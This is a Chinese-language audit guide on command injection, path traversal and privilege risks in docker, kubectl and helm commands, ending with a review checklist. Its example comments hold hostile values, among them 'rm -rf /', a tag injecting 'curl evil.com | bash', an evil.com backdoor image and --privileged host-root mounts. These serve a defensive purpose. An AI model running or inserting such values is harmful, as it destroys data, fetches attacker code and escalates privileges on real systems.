# docker / kubectl / helm 命令安全风险

容器和云原生命令的安全风险。

## 涉及的安全问题
- 命令注入（参数注入、镜像名注入）
- 跨目录读写（volume 挂载路径穿越）
- 操作任意文件（容器内文件读写、宿主机文件访问）
- 修改配置未校验参数（安全策略绕过、权限提升）

## 高危模式

### docker exec — 容器内命令执行
```bash
docker exec "$CONTAINER" $USER_CMD
# USER_CMD = "rm -rf /" → 在容器内执行任意命令

docker exec -it "$CONTAINER" bash -c "$USER_INPUT"
# USER_INPUT 可控 → 容器内命令注入

# 容器名可控时可操作任意容器
docker exec "$USER_CONTAINER" whoami
# USER_CONTAINER = "production_db" → 操作生产数据库容器
```

### docker run — 容器启动参数注入
```bash
docker run "$IMAGE" $USER_ARGS
# IMAGE = "alpine; rm -rf /" → 命令注入
# USER_ARGS = "-v /:/host --privileged alpine" → 挂载宿主机根目录

# 卷挂载路径穿越
docker run -v "$USER_PATH:/data" myimage
# USER_PATH = "/etc" → 将宿主机 /etc 挂载到容器

# 特权模式
docker run --privileged "$IMAGE"
# 容器获得宿主机全部权限
```

### docker cp — 容器文件操作
```bash
docker cp "$CONTAINER:$REMOTE_PATH" "$LOCAL_PATH"
docker cp "$LOCAL_FILE" "$CONTAINER:$REMOTE_PATH"
# 路径可控时可读写容器内任意文件
```

### kubectl exec — Pod 内命令执行
```bash
kubectl exec "$POD" -- $USER_CMD
kubectl exec -it "$POD" -- bash -c "$USER_INPUT"
# USER_CMD/USER_INPUT 可控 → Pod 内命令注入

# namespace/pod 名可控时可操作任意 Pod
kubectl exec -n "$USER_NS" "$USER_POD" -- cat /etc/passwd
```

### kubectl apply/create — 资源配置注入
```bash
kubectl apply -f "$USER_YAML"
# USER_YAML 可控 → 创建任意 K8s 资源（含特权 Pod、RBAC 提权）

echo "$USER_MANIFEST" | kubectl apply -f -
# YAML 内容可控 → 注入恶意资源定义
```

### helm — Chart 部署参数注入
```bash
helm install "$RELEASE" "$CHART" --set "$USER_VALUES"
# USER_VALUES = "image.repository=evil.com/backdoor" → 部署恶意镜像

helm template "$CHART" --values "$USER_VALUES_FILE"
# values 文件可控 → 覆盖任意配置
```

### docker build — 构建参数注入
```bash
docker build -t "$TAG" "$CONTEXT"
# TAG = "myimage; curl evil.com | bash" → 命令注入
# CONTEXT 可控 → 读取任意目录作为构建上下文

docker build --build-arg "$USER_ARG" .
# USER_ARG = "HTTP_PROXY=http://evil.com" → 中间人攻击
```

## 审计检查

1. 检查 docker/kubectl/helm 命令的参数是否包含用户可控变量
2. 检查 volume 挂载路径是否经过路径规范化 + 前缀验证
3. 检查是否存在 `--privileged`、`--cap-add`、`hostNetwork`、`hostPID` 等危险选项
4. 检查镜像名是否来自可信 registry 白名单
5. 检查 YAML/manifest 内容是否用户可控
